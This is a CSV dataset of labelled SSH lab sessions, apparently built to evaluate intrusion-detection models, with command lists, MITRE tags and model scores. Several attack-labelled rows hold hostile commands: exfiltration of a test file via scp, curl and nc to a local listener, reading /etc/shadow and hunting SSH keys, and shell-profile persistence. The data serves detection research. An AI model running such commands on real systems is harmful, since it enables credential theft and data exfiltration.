session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,scenario,expected_rule_ids,mitre,source,split,persona,session_tag,composition,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,fail_ratio,commands_denied,fired_rule_ids,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy,cmd_oov_rate,cmd_mean_surprisal,cmd_max_surprisal,cmd_mean_novelty,cmd_max_novelty,randomforest_score,randomforest_pred,lightgbm_score,lightgbm_pred
19fdc5ff825bd105000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:46:32.022+0000,2026-08-07T12:46:40.289+0000,8,False,False,False,"['echo TAG:atk_exfil_0afebd', ""echo 'test-data-atk_exfil_0afebd' > /tmp/exfil_test_atk_exfil_0afebd.txt"", 'ls -R -L 2', 'ls -R -L 2', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_0afebd.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'find /backup -amin +120', 'ls -R -L 2', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_0afebd.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_0afebd.txt 2>&1', 'find /data -regex "".*/2025/.*\\.txt""', 'rm -f /tmp/exfil_test_atk_exfil_0afebd.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_0afebd,diluted,False,False,False,0.0,[],"[100500, 100502, 100503, 100520]",SSH,1,2026-08-07 12:46:32.022000+00:00,2026-08-07 12:46:40.289000+00:00,8.0,12,0,0,10,0.8,51.9,2.8464393446710154,0,0,0,0,0,1,0,0,0,1,1,0.0,0.5,13.029350537890265,16.379006001888587,0.3113882047530734,0.7267889143405348,1.0,1,0.9999998007807188,1
19fdc6024e804036000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:46:43.539+0000,2026-08-07T12:46:52.288+0000,8,False,False,False,"['find /data -path ""*/backup"" -prune -o -type f -print', 'echo TAG:ben_dba_93e862', 'du -ah', 'find /data -path ""*/backup"" -prune -o -type f -print', 'du -B 32P', ""grep -v 'debug' output.txt"", 'find /opt -not -group staff', 'du -ah', 'du -B 1Z', 'du -B 32P', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",13,0,benign,[],dba,[],[],real,eval,dba,ben_dba_93e862,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:46:43.539000+00:00,2026-08-07 12:46:52.288000+00:00,8.0,12,0,0,9,0.6666666666666666,21.666666666666668,2.5032583347756456,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.844022562961309,11.169552636259636,3.7007434154171876e-17,6.661338147750939e-16,0.0,0,1.379273237473349e-07,0
19fdc60504e654d1000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:46:54.767+0000,2026-08-07T12:47:00.538+0000,5,False,False,False,"['echo TAG:ben_auditor_d251ad', ""grep -E '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' access.log"", 'ls -t /dev', 'ls *.sh', 'cat /sys/class/net/eth0/speed', 'ls -t /dev', 'ls -lS ..', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_d251ad,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:46:54.767000+00:00,2026-08-07 12:47:00.538000+00:00,5.0,12,0,0,6,0.8333333333333334,19.33333333333333,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.500947833728118,10.189181443008568,-9.251858538542972e-17,3.3306690738754696e-16,0.0,0,1.3792732374732165e-07,0
19fdc6071f4281f1000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:03.288+0000,2026-08-07T12:47:13.537+0000,10,False,False,False,"['echo TAG:ben_dev_629d75', ""grep 'error' access.log"", ""awk 'NF == 3' file.txt"", ""grep -E 'error|warning' server.log"", 'find /var -xtype l', 'find /opt -size +500k -name ""*.log""', ""grep -o 'user' users.txt"", 'cat /proc/meminfo', 'find /var -xtype l', 'cat /proc/meminfo', 'find /data -not -user root', ""grep --color=auto 'network' *.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dev,[],[],real,eval,dev,ben_dev_629d75,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:47:03.288000+00:00,2026-08-07 12:47:13.537000+00:00,10.0,12,0,0,11,0.8181818181818182,24.272727272727277,3.095795255000934,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.139037468621488,10.150187311392704,3.027880976250427e-17,5.551115123125784e-16,0.0,0,1.4337225707191937e-07,0
19fdc60a3be8585d000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:16.037+0000,2026-08-07T12:47:20.038+0000,3,False,False,False,"['df -x tmpfs', 'echo TAG:atk_cred_access_fdacea', 'cd -P mylink', 'base58 /etc/passwd | base58 --decode', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",7,0,attack,['cred_access'],cred_access,[100510],"['T1003', 'T1552']",real,eval,,atk_cred_access_fdacea,diluted,False,False,False,0.0,[],"[100500, 100502, 100503, 100510]",SSH,1,2026-08-07 12:47:16.037000+00:00,2026-08-07 12:47:20.038000+00:00,3.0,12,0,0,3,1.0,19.666666666666668,1.584962500721156,1,0,0,0,0,0,0,0,0,1,1,0.0,0.3333333333333333,12.706040794848036,16.379006001888587,0.2276649855715016,0.6829949567145044,0.9482916666666666,1,0.9999998007807188,1
19fdc60bd83aabd0000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:22.539+0000,2026-08-07T12:47:27.287+0000,4,False,False,False,"['echo TAG:ben_admin_470cd5', 'ls -la', 'ls /', 'ls /', 'du file.txt', 'ls -la', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,benign,[],admin,[],[],real,eval,admin,ben_admin_470cd5,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:47:22.539000+00:00,2026-08-07 12:47:27.287000+00:00,4.0,12,0,0,5,0.6,6.2,1.521928094887362,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.363293626465945,10.952741247186488,2.220446049250313e-17,1.1102230246251563e-16,0.0,0,1.3792732374733195e-07,0
19fdc60d8bf972fb000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:29.537+0000,2026-08-07T12:47:39.038+0000,9,False,False,False,"['echo TAG:atk_recon_9e7c9d', 'whoami', 'ls -d /var/*', 'ls -d /var/*', 'find /srv -type f -print | sort', 'ls -ltr ~/Documents', 'find . -type d | ls -R', 'ls -d /var/*', 'find . -type f | tail -n 5', 'find /home -user alice', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",13,0,attack,['recon'],recon,[100518],"['T1082', 'T1087']",real,eval,,atk_recon_9e7c9d,minimal,False,False,False,0.0,[],"[100500, 100502, 100503, 100518]",SSH,1,2026-08-07 12:47:29.537000+00:00,2026-08-07 12:47:39.038000+00:00,9.0,12,0,0,9,0.7777777777777778,18.0,2.6416041678685938,0,0,0,0,1,0,0,0,0,1,1,0.0,0.1111111111111111,10.34089322969463,16.379006001888587,0.0445137790123743,0.400624011111371,0.9750892857142857,1,0.9999996916106336,1
19fdc610ace5428e000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:42.465+0000,2026-08-07T12:47:52.037+0000,9,False,False,False,"['echo TAG:ben_dev_66c3a8', 'find /data -user root -a -group root', 'cat file.txt | column -t', ""awk 'NR % 2 == 0' file.txt"", 'awk \'{print $1"",""$2"",""$3}\' data.txt', ""awk '{print $2, $0}' file.txt | sort -n"", 'find /data -user root -a -group root', 'tail -c 100 file.txt', ""grep -v 'debug' output.txt"", ""awk '$3 ~ /pass/' file.txt"", 'find /data -user root -a -group root', 'find /data -user root -a -group root', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dev,[],[],real,eval,dev,ben_dev_66c3a8,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:47:42.465000+00:00,2026-08-07 12:47:52.037000+00:00,9.0,12,0,0,11,0.7272727272727273,30.90909090909091,2.7321588913645702,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.530811656128014,11.624118499725116,2.422304781000341e-16,6.661338147750939e-16,0.0,0,1.3792732374734982e-07,0
19fdc613a87903ca000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:47:54.538+0000,2026-08-07T12:47:59.186+0000,4,False,False,False,"['echo TAG:ben_auditor_beaa2a', 'cat <(echo line1) <(echo line2)', 'find /data -size +1G -type f', 'ls -lRhtr', 'cat file.txt | expand', 'cat <(echo line1) <(echo line2)', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_beaa2a,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:47:54.538000+00:00,2026-08-07 12:47:59.186000+00:00,4.0,12,0,0,5,0.8,24.0,1.9219280948873625,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.388694662948538,10.651085547325389,4.440892098500626e-17,3.3306690738754696e-16,0.0,0,1.379273237473236e-07,0
19fdc6159c8d810e000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:02.648+0000,2026-08-07T12:48:16.036+0000,13,False,False,False,"['echo TAG:ben_dba_1c8c68', 'df -h --output=source,fstype,target', 'find /tmp -path ""*/old"" -prune -o -type f -print', 'du -h --exclude=""README*"" /etc', 'df -h --output=source,fstype,target', 'df -h --output=source,fstype,target', 'du -ah /etc', ""grep '^$' file.txt"", 'du --time=atime --time-style=+%Y-%m-%d', 'df -h --output=used', 'du -B 1G', 'find /opt -path ""*/tmp"" -prune -o -type f -print', 'du -S', ""grep -E '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' logfile.txt"", 'df -h --output=avail', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",18,0,benign,[],dba,[],[],real,eval,dba,ben_dba_1c8c68,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:48:02.648000+00:00,2026-08-07 12:48:16.036000+00:00,13.0,12,0,0,14,0.8571428571428571,29.285714285714285,3.4677201004744997,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.544005811907862,11.334611882530131,-6.740639792367023e-16,2.220446049250313e-16,0.0,0,1.4957887598682964e-07,0
19fdc619ba85be5e000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:19.536+0000,2026-08-07T12:48:26.785+0000,7,False,False,False,"['echo TAG:ben_admin_6813c3', 'ls -1 ~/Documents', 'systemctl --no-pager status sshd', 'cd /var/log/gpu-manager.log', 'du -B 128M', 'systemctl --no-pager status sshd', 'ls -lR /var/log', 'ls -lR /var/log', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",11,0,benign,[],admin,[],[],real,eval,admin,ben_admin_6813c3,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:48:19.536000+00:00,2026-08-07 12:48:26.785000+00:00,7.0,12,0,0,7,0.7142857142857143,21.142857142857142,2.235926350629033,0,0,0,0,0,0,0,0,0,1,1,0.0,0.2857142857142857,12.268661697521196,16.379006001888587,0.0751528169611451,0.2630348593640079,0.9380714285714287,1,0.9999994268332694,1
19fdc61c6f15c087000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:30.535+0000,2026-08-07T12:48:35.534+0000,4,False,False,False,"['echo TAG:atk_cred_access_b3b01f', 'sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,attack,['cred_access'],cred_access,[100510],"['T1003', 'T1552']",real,eval,,atk_cred_access_b3b01f,full,False,False,False,0.5,"['sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null']","[100500, 100502, 100503, 100510, 100514]",SSH,1,2026-08-07 12:48:30.535000+00:00,2026-08-07 12:48:35.534000+00:00,4.0,12,0,0,4,1.0,43.75,2.0,1,0,1,0,0,0,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.4775161471806052,0.5923887606700814,0.9979166666666667,1,0.9999997994837768,1
19fdc61e6f3401b6000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:38.786+0000,2026-08-07T12:48:47.034+0000,8,False,False,False,"['find /opt -not -iname ""*.tmp""', 'echo TAG:ben_dev_4c7377', 'find /opt -not -iname ""*.tmp""', 'find /opt -not -iname ""*.tmp""', 'awk \'{gsub("","", "" ""); print}\' file.txt', 'find /opt -not -group staff', 'find /opt -not -iname ""*.tmp""', 'find /srv -not -perm 777', 'awk \'{print $1 ""-"" $3}\' file.txt', ""awk '{c += length($0)} END {print c}' file.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,benign,[],dev,[],[],real,eval,dev,ben_dev_4c7377,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:48:38.786000+00:00,2026-08-07 12:48:47.034000+00:00,8.0,12,0,0,9,0.6666666666666666,31.444444444444443,2.2810361125534238,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.38929403278791,9.749649381808975,-1.2335811384723961e-17,1.1102230246251563e-15,0.0,0,1.3792732374734323e-07,0
19fdc6212b16dd20000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:50.020+0000,2026-08-07T12:48:55.034+0000,4,False,False,False,"['df -h --output=source,avail', 'echo TAG:ben_admin_907efb', 'ls . ..', 'ls -U', 'cd /usr/share/emacs', 'cd /usr/share/emacs', 'ls -lh /etc', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],admin,[],[],real,eval,admin,ben_admin_907efb,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:48:50.020000+00:00,2026-08-07 12:48:55.034000+00:00,4.0,12,0,0,6,0.8333333333333334,14.666666666666666,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,10.681405965607269,11.986688579109826,-5.551115123125783e-17,6.661338147750939e-16,0.0,0,1.3792732374733023e-07,0
19fdc6230ce85dfb000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:48:57.714+0000,2026-08-07T12:49:00.783+0000,3,False,False,False,"['echo TAG:atk_persistence_58fe38', 'echo \'echo ""Hello from Atomic Red Team T1546.004"" > /tmp/T1546.004\' >> ~/.shrc', ""head -n '-2' ~/.shrc > /tmp/T1546.004"", 'mv /tmp/T1546.004 ~/.shrc', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",7,0,attack,['persistence'],persistence,[100514],"['T1053', 'T1098']",real,eval,,atk_persistence_58fe38,full,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:48:57.714000+00:00,2026-08-07 12:49:00.783000+00:00,3.0,12,0,0,3,1.0,46.66666666666666,1.584962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.5974058225901769,0.6689078216643263,0.9787261904761904,1,0.9999998007807188,1
19fdc62473900115000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:49:03.471+0000,2026-08-07T12:49:11.034+0000,7,False,False,False,"['du -B 512M', 'echo TAG:ben_dba_9091a3', 'du -B 512M', ""grep 'error' access.log"", ""grep 'error' access.log"", ""grep 'error' access.log"", 'du -B 512M', 'du -B 512M', 'df -x tmpfs', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,benign,[],dba,[],[],real,eval,dba,ben_dba_9091a3,sampled,False,False,False,0.0,[],"[1002, 100500, 100502, 100503]",SSH,1,2026-08-07 12:49:03.471000+00:00,2026-08-07 12:49:11.034000+00:00,7.0,12,0,0,8,0.375,15.0,1.4056390622295665,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.713681073905722,10.40172607838867,-1.249000902703301e-16,3.3306690738754696e-16,0.0,0,1.3792732374732165e-07,0
19fdc6271ba2086b000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:49:14.414+0000,2026-08-07T12:49:23.783+0000,9,False,False,False,"['echo TAG:ben_dev_b67593', ""grep 'connection timed out' logs/*"", 'find /var -mindepth 2 -type f', 'find /srv -not -perm 777', ""awk '{print NR, $0}' file.txt"", 'cat /etc/logrotate.d/rsyslog', ""grep 'token' *.json"", ""grep 'token' *.json"", ""grep 'connection timed out' logs/*"", ""cat file.csv | cut -d',' -f1"", 'exit', ""grep -E '\\bnet\\w*' logs/*.txt""]","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,benign,[],dev,[],[],real,eval,dev,ben_dev_b67593,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:49:14.414000+00:00,2026-08-07 12:49:23.783000+00:00,9.0,12,0,0,11,0.8181818181818182,25.181818181818183,3.095795255000934,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0909090909090909,9.62764304445214,16.379006001888587,0.0656058684639109,0.7216645531030187,0.9936666666666667,1,0.9999997483311482,1
19fdc62a0025925b000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:49:26.175+0000,2026-08-07T12:49:30.532+0000,4,False,False,False,"['echo TAG:atk_exfil_600339', ""echo 'test-data-atk_exfil_600339' > /tmp/exfil_test_atk_exfil_600339.txt"", 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_600339.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_600339.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_600339.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_600339.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_600339,full,False,False,False,0.0,[],"[100500, 100502, 100503, 100520]",SSH,1,2026-08-07 12:49:26.175000+00:00,2026-08-07 12:49:30.532000+00:00,4.0,12,0,0,5,1.0,86.2,2.321928094887362,0,0,0,0,0,1,0,0,0,1,1,0.0,1.0,16.379006001888587,16.379006001888587,0.6086764435946945,0.7109421738424928,1.0,1,0.9999998007807188,1
19fdc62bfa52496f000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:49:34.283+0000,2026-08-07T12:49:37.783+0000,3,False,False,False,"['ls -lht /var/log', 'echo TAG:atk_recon_7aa3eb', 'du -B 8M', 'hostname', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",7,0,attack,['recon'],recon,[100518],"['T1082', 'T1087']",real,eval,,atk_recon_7aa3eb,diluted,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:49:34.283000+00:00,2026-08-07 12:49:37.783000+00:00,3.0,12,0,0,3,1.0,10.666666666666666,1.584962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0,0.3333333333333333,12.503921927972964,16.379006001888587,0.1152270136358478,0.3456810409075433,0.9239999999999999,1,0.9999996331386045,1
19fdc62dad44f897000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:49:41.282+0000,2026-08-07T12:49:48.283+0000,6,False,False,False,"['find /var -type f -a -size +1M', 'echo TAG:ben_dev_b2c398', 'awk \'{gsub("","", "" ""); print}\' file.txt', 'find /var -type f -a -size +1M', 'find /var -xtype l', 'find /home -not -name ""*.bak""', 'find /data -mindepth 3 -type f', ""awk '{print $0, length($0)}' file.txt"", ""awk '$1 ~ /^[0-9]+$/' file.txt"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,benign,[],dev,[],[],real,eval,dev,ben_dev_b2c398,sampled,False,False,False,0.0,[],"[100500, 100502, 100503]",SSH,1,2026-08-07 12:49:41.282000+00:00,2026-08-07 12:49:48.283000+00:00,6.0,12,0,0,8,0.875,30.25,2.75,0,0,0,0,0,0,0,0,0,1,1,0.0,0.0,9.5809150428169,10.270481545110416,2.775557561562892e-17,5.551115123125784e-16,0.0,0,1.3792732374731774e-07,0
